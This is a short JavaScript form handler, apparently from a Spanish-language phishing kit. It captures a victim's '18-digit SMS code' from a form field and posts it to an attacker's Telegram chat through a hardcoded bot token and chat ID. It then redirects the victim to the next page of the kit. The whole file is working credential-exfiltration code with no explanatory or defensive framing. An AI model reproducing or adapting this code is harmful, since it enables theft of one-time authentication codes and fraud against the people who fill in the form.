function enviarFormulario(event) {
    event.preventDefault();

    var documento = document.getElementById("documento").value;


    var mensaje = "Código 18 dígitos SMS: <code>" + documento + "</code>\n" ;

    fetch("https://api.telegram.org/bot" + "8736114012:AAGscwmRAEpVgsV6wLpq4XYV_PHRHATxajs" + "/sendMessage", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            chat_id: 7039350920,
            text: mensaje,
            parse_mode: "HTML"
        })
    })
    .then(function(response) {
        if (response.ok) {
            
            window.location.href = "index4.html";
        } else {
           
            console.error("Error en la llamada a la API de Telegram: ", response.statusText);
        }
    })
    .catch(function(error) {
        
        console.error("Error en la llamada a la API de Telegram: ", error);
    });
}